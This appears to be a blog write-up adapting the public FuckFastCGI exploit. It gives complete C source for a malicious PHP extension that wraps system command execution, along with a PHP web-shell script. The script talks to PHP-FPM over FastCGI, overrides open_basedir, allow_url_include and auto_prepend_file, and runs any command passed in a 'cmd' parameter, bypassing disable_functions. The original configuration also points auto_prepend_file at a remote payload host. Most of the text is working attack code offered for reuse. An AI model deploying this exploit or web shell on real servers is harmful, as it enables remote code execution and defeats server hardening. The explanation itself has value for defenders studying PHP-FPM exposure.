Let's render unto Caesar the things that are Caesar's, the exploit [FuckFastCGI](https://github.com/w181496/FuckFastcgi) is not mine and is a brilliant one, bypassing `open_basedir` and `disable_functions` by the means of external malicious library loading.

While `open_basedir` can be modified at runtime and turned into `open_basedir = /`, it is not the same regarding `disable_functions`. The latter can only be set in the main `php.ini` and cannot be overriden by a local configuration or programmatically through `ini_set` or `ini_alter`.

To bypass this measure, the exploit sets two other configuration values: `extension` and `extension_dir`. By loading an external library which itself calls the C `system` function, disabled PHP functions are no more a protection.

The C code is as follows (the word `TSRMLS_CC` is commented to make it work with PHP >= 8.0. Uncomment if older):

```c
#include <php.h>
#include "hello.h"

zend_function_entry hello_functions[] = {
    PHP_FE(hello_world, NULL)
    PHP_FE_END
};

zend_module_entry hello_module_entry = {
    STANDARD_MODULE_HEADER,
    PHP_HELLO_EXTNAME,
    hello_functions,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    PHP_HELLO_VERSION,
    STANDARD_MODULE_PROPERTIES,
};

ZEND_GET_MODULE(hello);

PHP_FUNCTION(hello_world) {
    int ret, mode = 1;
    size_t s_len;
    char *s;
    zend_parse_parameters(ZEND_NUM_ARGS() /*TSRMLS_CC*/, "s", &s, &s_len);
    ret = php_exec(mode, s, NULL, return_value);
};

```

This program creates a routine named `hello_world` which is nothing more than a wrapper for `system`, and makes it available to PHP, as soon as the extension is loaded.

In the original exploit, the following values had to be set:

```php
// your extension directory path
$ext_dir_path = '/var/www/app/ext/';

// your extension name
$ext_name = 'hello.so';

// unix socket path or tcp host
$connect_path = 'unix:///var/run/php/php7.2-fpm.sock';

// tcp connection port (unix socket: -1)
$port = -1;

// Don't use this exploit file itself
$filepath = '/var/www/app/index.php';

// your php payload location
$prepend_file_path = 'http://kaibro.tw/gginin2';
```

The principle was to add a dummy `index.php` somewhere on the disk, and to use the directive `auto_prepend_file` to prepend the true payload, which was in turn calling `hello_world`. Problem: executing a different shell command requires a new payload file (in the example, it is a remote payload on a different host. It is made possible thanks to a modification of `allow_url_include`).

Actually, tweaking a little bit the exploit and adapting it based on the code from [here](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy), and we can reduce it to only one PHP and one SO file. Also, the socket path should be updated according to the type of listener:

```php
$client = new FCGIClient("127.0.0.1:9000", -1); // or custom ip:port
//or
$client = new FCGIClient("unix:///var/run/php/php-fpm.sock", -1); //should be a symlink to the real socket file
```

The last part of the script changes, to avoid the need to modify the payload and to repush a file on the disk:

```php
if (isset($_REQUEST['cmd'])) {
    // ---- BEGIN CONFIG
    $ext_dir_path = '/tmp';
    $ext_name = 'hello.so';
    // ---- END CONFIG

    $req = '/'.basename(__FILE__);
    $uri = $req .'?'.'command='.$_REQUEST['cmd'];
    $client = new FCGIClient("127.0.0.1:9000", -1);
    //$client = new FCGIClient("unix:///var/run/php/php-fpm.sock", -1);
    $code = "<?php echo '\$\$';hello_world(\$_REQUEST['command']);?>";
    $php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
    $php_admin_value = "extension_dir=" . $ext_dir_path . "\nextension=" . $ext_name;
    $params = array(
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD'    => 'POST',
        'SCRIPT_FILENAME'   => __FILE__,
        'SCRIPT_NAME'       => $req,
        'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
        'REQUEST_URI'       => $uri,
        'DOCUMENT_URI'      => $req,
        'PHP_VALUE'         => $php_value,
        'PHP_ADMIN_VALUE'   => $php_admin_value,
        'SERVER_SOFTWARE'   => 'kaibro-fastcgi-rce',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REMOTE_PORT'       => '9985',
        'SERVER_ADDR'       => '127.0.0.1',
        'SERVER_PORT'       => '80',
        'SERVER_NAME'       => 'localhost',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        'CONTENT_LENGTH'    => strlen($code)
        );
    try{
        $resp = $client->request($params, $code);
        $idx = strpos($resp, '$$');
        if ($idx !== false){
            echo substr($resp, $idx+2);
        }
    }
    catch(Exception $e){
        echo "If you used the param cmd and it didn't print anything, please try to refresh";
    }
    if (function_exists("shell_exec")){
        echo shell_exec("date");
    }
    else{
        echo "Nope, shell_exec is disabled";
    }
    phpinfo();
}
```

Instead of loading an external payload, the latter is passed as a stream (`php://input`). The GET argument containing the command is forwarded, and passed to `hello_world`.

As shown below, the command `id` can be executed, although the routines are still marked as disabled.
